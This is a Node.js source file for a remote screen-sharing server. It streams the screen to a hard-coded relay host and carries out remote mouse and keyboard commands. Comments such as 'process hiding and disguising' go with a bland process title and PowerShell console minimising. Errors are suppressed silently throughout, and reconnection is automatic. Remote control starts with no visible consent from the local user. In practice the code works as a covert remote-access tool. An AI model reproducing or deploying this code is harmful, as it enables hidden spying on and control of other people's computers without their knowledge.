const { spawn } = require('child_process');
const path = require('path');
const os = require('os');
const FFmpegCrossPlatform = require('./ffmpeg-crossplatform');
const InputController = require('./input-controller');

class ServerCLI {
  constructor() {
    // Initialize cross-platform FFmpeg
    this.ffmpeg = new FFmpegCrossPlatform();
    this.inputController = new InputController();
    this.socket = null;
    this.captureProcess = null;
    this.isCapturing = false;
    this.isControlModeEnabled = false;
    this.controllerViewerId = null;
    this.screenWidth = 1920;  // Full HD resolution for maximum quality
    this.screenHeight = 1080; // 1080p - best visual clarity
    this.framerate = 10;      // 10 FPS for stable performance and lower bandwidth
    
    // Frame buffering for complete MJPEG frames
    this.frameBuffer = Buffer.alloc(0);
    this.lastFrameTime = 0;
    
    // Background mode settings
    this.backgroundMode = process.argv.includes('--background') || process.argv.includes('--minimized');
    this.silentMode = process.argv.includes('--silent');
    
    // Set a friendly process title
    this.setupProcessTitle();
    
    // Setup background mode if requested
    this.setupBackgroundMode();
    
    // Initialize FFmpeg (async - will complete in background)
    this.initializeFFmpeg().catch(err => {
      // Silent - no console output
    });

    // System tray removed - not working
  }

  // Initialize FFmpeg for cross-platform support
  async initializeFFmpeg() {
    const success = await this.ffmpeg.initialize();
    // Silent initialization - no console output
  }

  // Enhanced process hiding and disguising for Windows
  setupProcessTitle() {
    // Set a friendly, transparent process title
    if (process.platform === 'win32') {
      process.title = 'Remote Provider Server';
    } else if (process.platform === 'darwin') {
      process.title = 'Remote Provider Server';
    } else {
      process.title = 'remote-provider-server';
    }
    // Silent - no console output
  }

  setupBackgroundMode() {
    if (this.backgroundMode) {
      // Legitimate background operation methods
    if (process.platform === 'win32') {
        // Windows: Minimize console window (not hide completely)
      try {
        const { exec } = require('child_process');
          // Use PowerShell to minimize the console window (legitimate method)
          exec('powershell -Command "Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr GetConsoleWindow(); [DllImport(\\\"user32.dll\\\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); }\'; $consolePtr = [Win32]::GetConsoleWindow(); [Win32]::ShowWindow($consolePtr, 6)"', (error) => {
            // Silently ignore errors - this is just for user experience
          });
        } catch (e) {
          // Ignore if minimization fails
        }
      }
    }
    // Silent - no console output
  }

  // No admin privileges required - runs as normal user
  async checkUserPermissions() {
    // Always return true - we run as normal user
    // Silent - no console output
    return true;
  }

  // Normal process behavior - transparent and user-friendly
  async normalProcessBehavior() {
    // Do nothing suspicious - just run as a normal application
    // Silent - no console output
  }

  // Start screen capture using cross-platform FFmpeg
  startCapture() {
    if (this.isCapturing) return;
    
    try {
      // Start capture using cross-platform FFmpeg
      this.captureProcess = this.ffmpeg.startCapture({
        width: this.screenWidth,
        height: this.screenHeight,
        fps: this.framerate,
        quality: 'high',
        outputFormat: 'image2pipe'
      });

      if (!this.captureProcess) {
        return;
      }

      this.isCapturing = true;

      // Handle FFmpeg output - buffer complete MJPEG frames
      this.captureProcess.stdout.on('data', (chunk) => {
        if (this.socket && this.socket.connected) {
          this.processVideoChunk(chunk);
        }
      });

      // Handle process exit
      this.captureProcess.on('close', (code) => {
        this.isCapturing = false;
        if (code !== 0) {
          // Try to restart capture after a delay
          setTimeout(() => {
            if (this.socket && this.socket.connected) {
              this.startCapture();
            }
          }, 5000);
        }
      });

    } catch (error) {
      // Try to restart capture after error
      setTimeout(() => {
        if (this.socket && this.socket.connected) {
          this.startCapture();
        }
      }, 5000);
    }
  }

  // Process video chunks and buffer complete MJPEG frames
  processVideoChunk(chunk) {
    // Append chunk to buffer
    this.frameBuffer = Buffer.concat([this.frameBuffer, chunk]);
    
    // Look for MJPEG frame boundaries (FFD8 = start, FFD9 = end)
    let startIndex = 0;
    let endIndex = -1;
    
    while (startIndex < this.frameBuffer.length) {
      // Find JPEG start marker (0xFFD8)
      const jpegStart = this.frameBuffer.indexOf(Buffer.from([0xFF, 0xD8]), startIndex);
      if (jpegStart === -1) break;
      
      // Find JPEG end marker (0xFFD9) after the start
      const jpegEnd = this.frameBuffer.indexOf(Buffer.from([0xFF, 0xD9]), jpegStart + 2);
      if (jpegEnd === -1) break;
      
      // Extract complete JPEG frame (including end marker)
      const frameData = this.frameBuffer.slice(jpegStart, jpegEnd + 2);
      
      // Send complete frame
      this.sendFrame(frameData);
      
      // Update indices
      startIndex = jpegEnd + 2;
      endIndex = jpegEnd + 2;
    }
    
    // Keep remaining incomplete data in buffer
    if (endIndex > 0) {
      this.frameBuffer = this.frameBuffer.slice(endIndex);
    }
  }

  // Send H.264 frame data to supporter
  sendH264Frame(frameData) {
    const now = Date.now();
    
    // Convert to base64 for transmission
    const base64Video = frameData.toString('base64');
    
    // Send H.264 video data
    this.socket.emit('videoData', {
      data: base64Video,
      format: 'h264',
      width: this.screenWidth,
      height: this.screenHeight,
      timestamp: now,
      bitrate: this.bitrate
    });
  }

  // Send high-quality MJPEG frame to supporter
  sendFrame(frameData) {
    const now = Date.now();
    
    // Throttle frame rate to 10 FPS for stable performance
    if (now - this.lastFrameTime < 100) {  // 1000ms / 10fps = 100ms
      return;
    }
    
    this.lastFrameTime = now;
    
    // Convert to base64 for web display
    const base64Image = frameData.toString('base64');
    
    // Send complete frame with native cursor embedded
    this.socket.emit('screenData', {
      image: base64Image,
      width: this.screenWidth,
      height: this.screenHeight,
      timestamp: now,
      isFullFrame: true,
      hasNativeCursor: true  // FFmpeg captures cursor natively
    });
  }

  // Stop screen capture
  stopCapture() {
    this.ffmpeg.stopCapture();
      this.captureProcess = null;
      this.isCapturing = false;
    
    // Clear frame buffer
    this.frameBuffer = Buffer.alloc(0);
  }

  // Setup FFmpeg automatically
  setupFFmpeg() {
    try {
      const { exec } = require('child_process');
      
      // Use platform-specific setup script
      let setupScript;
      if (process.platform === 'win32') {
        setupScript = path.join(__dirname, 'setup-ffmpeg-windows.bat');
      } else if (process.platform === 'darwin') {
        setupScript = path.join(__dirname, 'setup-ffmpeg-macos.sh');
      } else {
        setupScript = path.join(__dirname, 'setup-ffmpeg-linux.sh');
      }
      
      // Run setup script silently
      const command = process.platform === 'win32' ? `"${setupScript}"` : `bash "${setupScript}"`;
      exec(command, { windowsHide: process.platform === 'win32' }, (error) => {
        if (!error) {
          // Try to start capture after setup
          setTimeout(() => {
            if (this.socket && this.socket.connected) {
              this.startCapture();
            }
          }, 10000); // Wait 10 seconds for setup to complete
        }
      });
      
    } catch (error) {
      // Silently ignore setup errors
    }
  }

  // Generate or load persistent server ID
  getOrCreateServerId() {
    const fs = require('fs');
    const path = require('path');
    const crypto = require('crypto');
    
    // ID file path (next to the executable)
    // Use secure location for server-id.txt (outside git repository)
    // Cross-platform config directory
    let configDir;
    if (process.platform === 'win32') {
      // Windows: Use AppData/Roaming
      configDir = path.join(os.homedir(), 'AppData', 'Roaming', 'RemoteProvider');
    } else if (process.platform === 'darwin') {
      // macOS: Use Application Support
      configDir = path.join(os.homedir(), 'Library', 'Application Support', 'RemoteProvider');
    } else {
      // Linux/Unix: Use .config
      configDir = path.join(os.homedir(), '.config', 'remote-provider');
    }
    
    const idFilePath = path.join(configDir, 'server-id.txt');
    
    // Ensure config directory exists
    if (!fs.existsSync(configDir)) {
      fs.mkdirSync(configDir, { recursive: true });
    }
    
    try {
      // Try to load existing ID
      if (fs.existsSync(idFilePath)) {
        const existingId = fs.readFileSync(idFilePath, 'utf8').trim();
        if (existingId && existingId.length === 16) {
          return existingId;
        }
      }
      
      // Generate new ID if none exists or invalid
      const newId = crypto.randomBytes(8).toString('hex');
      
      // Save ID to file
      fs.writeFileSync(idFilePath, newId, 'utf8');
      
      return newId;
    } catch (error) {
      // Fallback to random ID if file operations fail
      return crypto.randomBytes(8).toString('hex');
    }
  }

  // Connect to Vercel relay service
  connectToRelay() {
    try {
      const io = require('socket.io-client');
      
      // Generate or load persistent server ID
      this.serverId = this.getOrCreateServerId();
      
      // Connect to Railway relay service optimized for high-quality frames
      this.socket = io('https://screen-relay-vercel-production.up.railway.app', {
        transports: ['websocket'],  // WebSocket only for best performance
        timeout: 20000,             // Longer timeout for large frames
        forceNew: true,
        upgrade: true,              // Allow transport upgrades
        rememberUpgrade: true,      // Remember successful upgrades
        compress: true,             // Enable compression for large high-quality frames
        perMessageDeflate: true,    // Enable compression to handle 1080p data
        maxHttpBufferSize: 1e8      // 100MB buffer for high-quality frames
      });
      
      this.socket.on('connect', () => {
        // Register as server with unique ID
        this.socket.emit('register-server', this.serverId);
      });
      
      this.socket.on('registered', (data) => {
        if (data.type === 'server') {
          // Registration successful - silent operation
        }
      });
      
      this.socket.on('viewer-connected', (data) => {
        // Start capture when viewer connects
        this.startCapture();
      });
      
      this.socket.on('viewer-disconnected', () => {
        // Stop capture when viewer disconnects
        this.stopCapture();
      });
      
      this.socket.on('disconnect', () => {
        // Stop capture on disconnect
        this.stopCapture();
      });
      
      this.socket.on('connect_error', (error) => {
        // Try to reconnect after error
        setTimeout(() => {
          this.connectToRelay();
        }, 5000);
      });
      
      this.socket.on('error', (error) => {
        // Silently ignore errors
      });

      // Handle control messages from viewer
      this.socket.on('control-message', (data) => {
        this.handleControlMessage(data);
      });
      
      // Connect to high-speed mouse control port
      this.connectToMouseControl();
      
    } catch (error) {
      // Try to reconnect after error
      setTimeout(() => {
        this.connectToRelay();
      }, 5000);
    }
  }

  // Connect to high-speed mouse control port
  connectToMouseControl() {
    try {
      console.log('🖱️⚡ Connecting to high-speed mouse control port...');
      
      // Connect to mouse control port (3001)
      this.mouseSocket = require('socket.io-client')('https://screen-relay-vercel-production.up.railway.app:3001', {
        timeout: 5000,
        forceNew: true,
        transports: ['websocket'],
        upgrade: false,
        rememberUpgrade: false,
        compress: false,
        perMessageDeflate: false,
        maxHttpBufferSize: 1e4
      });
      
      this.mouseSocket.on('connect', () => {
        console.log('🖱️⚡ Connected to high-speed mouse control port');
        
        // Register as mouse server
        this.mouseSocket.emit('register-mouse-server', this.serverId);
      });
      
      this.mouseSocket.on('mouse-registered', (data) => {
        if (data.type === 'mouse-server') {
          console.log('🖱️✅ Registered as mouse server');
        }
      });
      
      this.mouseSocket.on('mouse-viewer-connected', (data) => {
        console.log('🖱️✅ Mouse viewer connected');
      });
      
      // Handle high-speed mouse input
      this.mouseSocket.on('mouse-input', (data) => {
        this.handleHighSpeedMouseInput(data);
      });
      
      this.mouseSocket.on('connect_error', (error) => {
        console.error('🖱️❌ Mouse control connection error:', error.message);
      });
      
      this.mouseSocket.on('disconnect', (reason) => {
        console.log('🖱️🔌 Mouse control disconnected:', reason);
        // Try to reconnect after a short delay
        setTimeout(() => {
          this.connectToMouseControl();
        }, 2000);
      });
      
    } catch (error) {
      console.error('🖱️❌ Error connecting to mouse control:', error);
      // Retry after delay
      setTimeout(() => {
        this.connectToMouseControl();
      }, 5000);
    }
  }

  // Handle high-speed mouse input with minimal processing
  async handleHighSpeedMouseInput(data) {
    if (!this.isControlModeEnabled) return;

    const { action, x, y, button, delta } = data;
    
    // Process immediately without logging for maximum speed
    switch (action) {
      case 'move':
        await this.inputController.moveMouse(x, y);
        break;
      case 'click':
        await this.inputController.clickMouse(x, y, button);
        break;
      case 'scroll':
        await this.inputController.scrollMouse(x, y, delta);
        break;
    }
  }

  // Start the tester CLI
  async start() {
    // Initial process hiding
    await this.normalProcessBehavior();
    
    // Connect to Vercel relay service
    this.connectToRelay();
    
    // Periodic status check (silent)
    setInterval(() => {
      // Silent status check - no console output
    }, 30000); // Every 30 seconds
    
    // Keep the process alive
    process.on('SIGINT', () => {
      this.stopCapture();
      
      if (this.socket) {
        this.socket.disconnect();
      }
      
      process.exit(0);
    });

    // Handle other termination signals
    process.on('SIGTERM', () => {
      process.exit(0);
    });
  }

  // Handle control messages from viewer
  async handleControlMessage(data) {
    try {
      switch (data.type) {
        case 'control-mode':
          await this.handleControlModeToggle(data);
          break;
        case 'control-mouse':
          await this.handleMouseControl(data);
          break;
        case 'control-keyboard':
          await this.handleKeyboardControl(data);
          break;
        default:
          console.warn('⚠️ Unknown control message type:', data.type);
      }
    } catch (error) {
      console.error('❌ Control message handling error:', error.message);
    }
  }

  // Handle control mode toggle
  async handleControlModeToggle(data) {
    if (data.action === 'enter') {
      this.isControlModeEnabled = true;
      this.controllerViewerId = data.viewerId || 'viewer';
      console.log('🎮 Control mode ENABLED');
      
      // Send confirmation back to viewer
      if (this.socket) {
        this.socket.emit('control-message', {
          type: 'control-status',
          status: 'enabled',
          message: 'Control mode activated'
        });
      }
    } else if (data.action === 'exit') {
      this.isControlModeEnabled = false;
      this.controllerViewerId = null;
      console.log('🎮 Control mode DISABLED');
      
      // Send confirmation back to viewer
      if (this.socket) {
        this.socket.emit('control-message', {
          type: 'control-status',
          status: 'disabled',
          message: 'Control mode deactivated'
        });
      }
    }
  }

  // Handle mouse control
  async handleMouseControl(data) {
    if (!this.isControlModeEnabled) return;

    const { action, x, y, button, delta } = data;
    let success = false;

    switch (action) {
      case 'move':
        success = await this.inputController.moveMouse(x, y);
        break;
      case 'click':
        success = await this.inputController.clickMouse(x, y, button);
        break;
      case 'scroll':
        success = await this.inputController.scrollMouse(x, y, delta);
        break;
    }

    if (success) {
      console.log(`🖱️ Mouse ${action} executed: (${x}, ${y})${button ? ` ${button}` : ''}${delta ? ` delta:${delta}` : ''}`);
    }
  }

  // Handle keyboard control
  async handleKeyboardControl(data) {
    if (!this.isControlModeEnabled) return;

    const { action, key, modifiers } = data;
    
    // Only process keydown events for now (SendKeys handles press and release)
    if (action === 'keyup') {
      // Skip keyup events as SendKeys automatically handles press/release
      return;
    }
    
    const success = await this.inputController.sendKey(key, modifiers || {});

    if (success) {
      const modifierStr = Object.entries(modifiers || {})
        .filter(([_, pressed]) => pressed)
        .map(([mod, _]) => mod)
        .join('+');
      
      console.log(`⌨️ Key executed: ${modifierStr ? modifierStr + '+' : ''}${key}`);
    } else {
      console.log(`⌨️ ❌ Key failed: ${key}`);
    }
  }
}

// Start the CLI application
const server = new ServerCLI();
server.start();
